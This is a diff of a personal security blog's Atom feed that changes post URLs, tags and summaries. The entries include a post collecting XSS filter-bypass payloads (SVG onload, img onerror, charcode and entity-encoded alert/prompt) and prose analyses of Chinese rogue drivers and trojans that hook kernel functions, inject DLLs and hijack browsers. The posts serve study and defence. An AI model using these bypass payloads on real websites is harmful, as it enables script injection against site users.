-      <category term="无法描述" scheme="http://blog.idhyt.com/categories/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
+      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[xss bypass]]></title>
-    <link href="http://blog.idhyt.com/2014/10/15/2-xss-bypass/"/>
-    <id>http://blog.idhyt.com/2014/10/15/2-xss-bypass/</id>
+    <link href="http://blog.idhyt.com/2014/10/15/technic-xss-bypass/"/>
+    <id>http://blog.idhyt.com/2014/10/15/technic-xss-bypass/</id>
     <published>2014-10-15T03:56:24.000Z</published>
-    <updated>2015-12-28T06:31:38.000Z</updated>
+    <updated>2015-12-31T11:53:23.000Z</updated>
     <content type="html"><![CDATA[<p>xss绕过技巧整理</p>
 <h3 id="几种弹窗绕过">几种弹窗绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="number">1</span>) = <span class="built_in">Function</span>(alert(<span class="number">1</span>))()</span><br><span class="line">= <span class="built_in">Function</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()</span><br><span class="line"><span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>对应alert(<span class="number">1</span>) ascii码的<span class="number">10</span>进制形式（Text2Dec）</span><br><span class="line"><span class="comment">//小写function</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>)</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line">alert(<span class="number">1</span>) confirm(<span class="number">1</span>)  prompt(<span class="number">1</span>)</span><br><span class="line">&lt;SVG/onload=prompt(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">BODY</span> <span class="attribute">onload</span>=<span class="value">"alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">1</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">alert(1)</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;/<span class="title">scirpt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">form</span> <span class="attribute">action</span>=<span class="value">"javascript:prompt(1)"</span> <span class="attribute">method</span>=<span class="value">"post"</span>&gt;</span><span class="tag">&lt;<span class="title">input</span> <span class="attribute">name</span>=<span class="value">"action"</span> <span class="attribute">value</span>=<span class="value">"b"</span>&gt;</span><span class="tag">&lt;/<span class="title">form</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">a</span>=<span class="value">"&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="</span><span class="value">comment"</span> <span class="attribute">title</span>=<span class="value">""</span><span class="value">onload='</span>/*"&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">"*/prompt(1)'"</span>&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span>   ==》<span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">a</span>=<span class="value">""</span><span class="value">xxx"</span>/<span class="attribute">onload</span>=<span class="value">'prompt(21)'</span><span class="value">"&gt;&lt;/p&gt;</span></span></span></span></span></span><br></pre></td></tr></table></figure>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//过滤= 括号等 使用xml编码</span></span><br><span class="line">&lt;svg&gt; <span class="xml"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  </span><br><span class="line">//在SVG向量里面的<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">元素（或者其他CDATA元素 ），会先进行xml解析。因此&amp;#x28（十六进制）或者&amp;#40（十进制）或者&amp;lpar；（html实体编码）会被还原成（。</span></span></span><br></pre></td></tr></table></figure>
@@ -1218,17 +1218,17 @@ Are you sure you want to continue connecting (yes/no)?
     
       <category term="xss" scheme="http://blog.idhyt.com/tags/xss/"/>
     
-      <category term="web" scheme="http://blog.idhyt.com/categories/web/"/>
+      <category term="technic" scheme="http://blog.idhyt.com/categories/technic/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[病毒分析-haimianbaobao流氓驱动]]></title>
-    <link href="http://blog.idhyt.com/2014/09/10/3-virus-malware-driver-hmbb/"/>
-    <id>http://blog.idhyt.com/2014/09/10/3-virus-malware-driver-hmbb/</id>
+    <link href="http://blog.idhyt.com/2014/09/10/virus-malware-driver-hmbb/"/>
+    <id>http://blog.idhyt.com/2014/09/10/virus-malware-driver-hmbb/</id>
     <published>2014-09-10T09:52:11.000Z</published>
-    <updated>2015-09-20T14:47:19.000Z</updated>
-    <content type="html"><![CDATA[<p>haimianbaobao流氓驱动行为分析以及溯源追查<a id="more"></a></p>
+    <updated>2015-12-31T11:57:52.000Z</updated>
+    <content type="html"><![CDATA[<p>haimianbaobao流氓驱动行为分析以及溯源追查</p>
 <h2 id="简介">简介</h2><p>MD5 : b9003854bee6ea8e5b1fc24ebc99bb4a<br>行为: haimianbaobao.exe流氓驱动，劫持浏览器，过滤杀软</p>
 <p>1.该驱动程序注册一个进程创建回调函数，监视浏览器创建主进程，注入dll文件对浏览器操作进行劫持。</p>
 <p>2.通过HOOK驱动\FileSystem\Ntfs与SSDT表中大量的内核函数，从而过滤掉杀软对其操作，保护自身。</p>
@@ -1275,23 +1275,26 @@ Are you sure you want to continue connecting (yes/no)?
 <p>10.后续<br>卒…</p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p>haimianbaobao流氓驱动行为分析以及溯源追查]]>
-    
+    <![CDATA[<p>haimianbaobao流氓驱动行为分析以及溯源追查</p>
+<h2 id="简介">简介</h2><p>MD5 : b9003854bee6ea8e5b1fc24ebc99bb4a<br>行为: haimianbaobao.exe流氓驱动，劫持浏览器，过滤杀软</p>
+]]>
     </summary>
     
-      <category term="virus" scheme="http://blog.idhyt.com/tags/virus/"/>
+      <category term="流氓" scheme="http://blog.idhyt.com/tags/%E6%B5%81%E6%B0%93/"/>
     
-      <category term="逆向" scheme="http://blog.idhyt.com/categories/%E9%80%86%E5%90%91/"/>
+      <category term="驱动" scheme="http://blog.idhyt.com/tags/%E9%A9%B1%E5%8A%A8/"/>
+    
+      <category term="virus" scheme="http://blog.idhyt.com/categories/virus/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[病毒分析-驱动过滤]]></title>
-    <link href="http://blog.idhyt.com/2014/09/02/3-virus-malware-driver-filter/"/>
-    <id>http://blog.idhyt.com/2014/09/02/3-virus-malware-driver-filter/</id>
+    <link href="http://blog.idhyt.com/2014/09/02/virus-malware-driver-filter/"/>
+    <id>http://blog.idhyt.com/2014/09/02/virus-malware-driver-filter/</id>
     <published>2014-09-02T08:54:11.000Z</published>
-    <updated>2015-09-20T14:47:19.000Z</updated>
-    <content type="html"><![CDATA[<p>一个流氓驱动行为简略分析<a id="more"></a></p>
+    <updated>2015-12-31T11:37:43.000Z</updated>
+    <content type="html"><![CDATA[<p>一个流氓驱动行为简略分析</p>
 <h2 id="简介">简介</h2><p>驱动模块主要两个功能：<br>1.通过PsSetLoadImageNotifyRoutine创建一个进程创建回调函数NotifyRoutine，用于监控explorer.exe进程进行注入</p>
 <p>2.添加TCP过滤，用于向远程服务器发送GET请求，请求数据为各个函数调用状态</p>
 <p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-1.jpg" alt=""></p>
@@ -1307,23 +1310,25 @@ SESID为当前系统时间
 <p>3.获取\SystemRoot\system32\目录下的thunk.dll和winntnetsys.dll，计算出MD5值进行效验，效验成功开始注入。注入通过修改PEB结构+0x18处DefaultHeap到自定义的堆结构中，将其插入APC队列中加载到内存。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-8.jpg" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-9.jpg" alt=""></p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p>一个流氓驱动行为简略分析]]>
-    
+    <![CDATA[<p>一个流氓驱动行为简略分析</p>
+<h2 id="简介">简介</h2><p>驱动模块主要两个功能：<br>1.通过PsSetLoadImageNotifyRoutine创建一个进程创建回调函数NotifyRoutine，用于监控explorer.exe进程进行注入</p>]]>
     </summary>
     
-      <category term="virus" scheme="http://blog.idhyt.com/tags/virus/"/>
+      <category term="过滤" scheme="http://blog.idhyt.com/tags/%E8%BF%87%E6%BB%A4/"/>
     
-      <category term="逆向" scheme="http://blog.idhyt.com/categories/%E9%80%86%E5%90%91/"/>
+      <category term="驱动" scheme="http://blog.idhyt.com/tags/%E9%A9%B1%E5%8A%A8/"/>
+    
+      <category term="virus" scheme="http://blog.idhyt.com/categories/virus/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[病毒分析-捆绑推广]]></title>
-    <link href="http://blog.idhyt.com/2014/07/24/3-virus-malware-winrar/"/>
-    <id>http://blog.idhyt.com/2014/07/24/3-virus-malware-winrar/</id>
+    <link href="http://blog.idhyt.com/2014/07/24/virus-malware-winrar/"/>
+    <id>http://blog.idhyt.com/2014/07/24/virus-malware-winrar/</id>
     <published>2014-07-24T06:13:11.000Z</published>
-    <updated>2015-09-20T14:47:19.000Z</updated>
-    <content type="html"><![CDATA[<p>捆绑安装，流氓推广<a id="more"></a></p>
+    <updated>2015-12-31T11:57:58.000Z</updated>
+    <content type="html"><![CDATA[<p>捆绑安装，流氓推广</p>
 <h2 id="简介">简介</h2><p>1.压缩软件Winrar官方安装包中附带了没有数字签名病毒文件WinRAROp.exe，该文件在Winrar安装时一并运行。</p>
 <p>2.病毒文件运行之后解密同目录下的zap.dat文件并释放病毒子体sclvntfy.dll文件以及驱动文件，之后添加驱动服务以及设置自启动，篡改浏览器主页，终止杀软，劫持用户浏览器打开推广页面<a href="http://123.sogou.com/?21607" target="_blank" rel="external">http://123.sogou.com/?21607</a></p>
 <h2 id="母体运行流程">母体运行流程</h2><p>释放子体<br>1.创建目录”C:\RavRecycle\temp\”,7F,””,7F,””,7F,””,7F,””,7F,””,7F,””,7F,””,7F,”?..\”并设置属性为HIDDEN|SYSTEM|DIRECTORY</p>
@@ -1360,23 +1365,24 @@ C:<span class="command">\Program</span> Files<span class="command">\winrar</span
 <p>4.过滤其他主页保护进程<br>LoadLibraryExW在加载dll文件之前会先判断dll文件是否为其他的主页保护文件，如果是的话，直接退出不加载。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-winrar-12.jpg" alt=""></p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p>捆绑安装，流氓推广]]>
-    
+    <![CDATA[<p>捆绑安装，流氓推广</p>
+<h2 id="简介">简介</h2><p>1.压缩软件Winrar官方安装包中附带了没有数字签名病毒文件WinRAROp.exe，该文件在Winrar安装时一并运行。</p>
+<p>2.病毒文件运行之后解密同目录下的zap.dat文件并释放病毒]]>
     </summary>
     
-      <category term="virus" scheme="http://blog.idhyt.com/tags/virus/"/>
+      <category term="推广" scheme="http://blog.idhyt.com/tags/%E6%8E%A8%E5%B9%BF/"/>
     
-      <category term="逆向" scheme="http://blog.idhyt.com/categories/%E9%80%86%E5%90%91/"/>
+      <category term="virus" scheme="http://blog.idhyt.com/categories/virus/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[病毒分析-淘宝客]]></title>
-    <link href="http://blog.idhyt.com/2014/01/11/3-virus-troj-taobao/"/>
-    <id>http://blog.idhyt.com/2014/01/11/3-virus-troj-taobao/</id>
+    <link href="http://blog.idhyt.com/2014/01/11/virus-troj-taobao/"/>
+    <id>http://blog.idhyt.com/2014/01/11/virus-troj-taobao/</id>
     <published>2014-01-11T03:11:11.000Z</published>
-    <updated>2015-09-20T14:47:19.000Z</updated>
-    <content type="html"><![CDATA[<p>淘宝客病毒分析，附带驱动过滤<a id="more"></a></p>
+    <updated>2015-12-31T11:41:08.000Z</updated>
+    <content type="html"><![CDATA[<p>淘宝客病毒分析，附带驱动过滤</p>
 <h2 id="调试环境：">调试环境：</h2><p>Windows XP SP3, OD, IDA, 010Editor等</p>
 <h2 id="病毒简介">病毒简介</h2><p>该病毒程序运行后会先创建一个正常的游戏进程，之后会在系统目录下生成一个驱动文件并加载，该驱动文件用于劫持用户访问的淘宝，京东，当当等网站，将其重定向事先设计好的网站从而获取利益，该驱动模块可以从指定的URL自动下载过滤规则和更新驱动文件，并搜集用户系统信息发送到服务器。</p>
 <h2 id="病毒运行流程">病毒运行流程</h2><p>1.病毒母体运行后会释放一个正常的游戏文件并运行，之后判断系统平台，如果是32位则在内存中释放出两个DLL文件B70000.DLL和BD0000.DLL</p>
@@ -1452,23 +1458,28 @@ C:<span class="command">\Program</span> Files<span class="command">\winrar</span
 <h3 id="自保护">自保护</h3><p>创建线程：mfc42w+0x7560保护驱动自身注册表信息。<br>循环检测驱动注册表是否已创建，如果不存在，则创建，创建方式同功能函数  Autorii 相同，在注册表\System\ControlSet001\Services\mfc42w下生成驱动服务所需的四个子项<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-troj-driver-9.jpg" alt=""></p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p>淘宝客病毒分析，附带驱动过滤]]>
-    
+    <![CDATA[<p>淘宝客病毒分析，附带驱动过滤</p>
+<h2 id="调试环境：">调试环境：</h2><p>Windows XP SP3, OD, IDA, 010Editor等</p>
+<h2 id="病毒简介">病毒简介</h2><p>该病毒程序运行后会先创建一个正常的游戏进程，之后]]>
     </summary>
     
-      <category term="virus" scheme="http://blog.idhyt.com/tags/virus/"/>
+      <category term="淘宝客" scheme="http://blog.idhyt.com/tags/%E6%B7%98%E5%AE%9D%E5%AE%A2/"/>
     
-      <category term="逆向" scheme="http://blog.idhyt.com/categories/%E9%80%86%E5%90%91/"/>
+      <category term="过滤" scheme="http://blog.idhyt.com/tags/%E8%BF%87%E6%BB%A4/"/>
+    
+      <category term="驱动" scheme="http://blog.idhyt.com/tags/%E9%A9%B1%E5%8A%A8/"/>
+    
+      <category term="virus" scheme="http://blog.idhyt.com/categories/virus/"/>
     
   </entry>
   
   <entry>
     <title><![CDATA[病毒分析-parite感染型]]></title>
-    <link href="http://blog.idhyt.com/2014/01/05/3-virus-infected-parite/"/>
-    <id>http://blog.idhyt.com/2014/01/05/3-virus-infected-parite/</id>
+    <link href="http://blog.idhyt.com/2014/01/05/virus-infected-parite/"/>
+    <id>http://blog.idhyt.com/2014/01/05/virus-infected-parite/</id>
     <published>2014-01-05T03:11:11.000Z</published>
-    <updated>2015-09-20T14:47:19.000Z</updated>
-    <content type="html"><![CDATA[<p>parite感染型病毒行为分析 <a id="more"></a></p>
+    <updated>2015-12-31T11:57:14.000Z</updated>
+    <content type="html"><![CDATA[<p>parite感染型病毒行为分析</p>
 <h2 id="病毒信息">病毒信息</h2><p>文件类型：dll文件(PE)<br>大小: 176128 字节<br>MD5: 4F407B29D53E9EB54E22D096FCE82AA7<br>加壳方式：UPX 0.80 - 1.24 DLL -&gt; Markus &amp; Laszlo<br>编写语言：Borland C++ DLL Method 2</p>
 <h2 id="病毒简介">病毒简介</h2><p>1.感染病毒通过在Explorer注册表下添加键值，导致Explorer进程创建时会装载感染Dll去创建一个新的线程感染系统文件，包括感染硬盘exe和src文件，同时会去感染同域下的其他系统。</p>
 <p>2.同时在感染dll中Initiate函数，通过HOOK文件操作函数和注入全局钩子，监控并注入其他进程进行感染操作。</p>
@@ -1498,13 +1509,13 @@ C:<span class="command">\Program</span> Files<span class="command">\winrar</span
 <p>5.修复程序OEP代码，修复导入表(去除插入的感染dll)</p>
 ]]></content>
     <summary type="html">
-    <![CDATA[<p>parite感染型病毒行为分析]]>
-    
+    <![CDATA[<p>parite感染型病毒行为分析</p>
+<h2 id="病毒信息">病毒信息</h2><p>文件类型：dll文件(PE)<br>大小: 176128 字节<br>MD5: 4F407B29D53E9EB54E22D096FCE82AA7<br>加壳方式：UPX 0.80 -]]>
     </summary>
     
-      <category term="virus" scheme="http://blog.idhyt.com/tags/virus/"/>
+      <category term="感染" scheme="http://blog.idhyt.com/tags/%E6%84%9F%E6%9F%93/"/>
     
-      <category term="逆向" scheme="http://blog.idhyt.com/categories/%E9%80%86%E5%90%91/"/>
+      <category term="virus" scheme="http://blog.idhyt.com/categories/virus/"/>
     
   </entry>
   
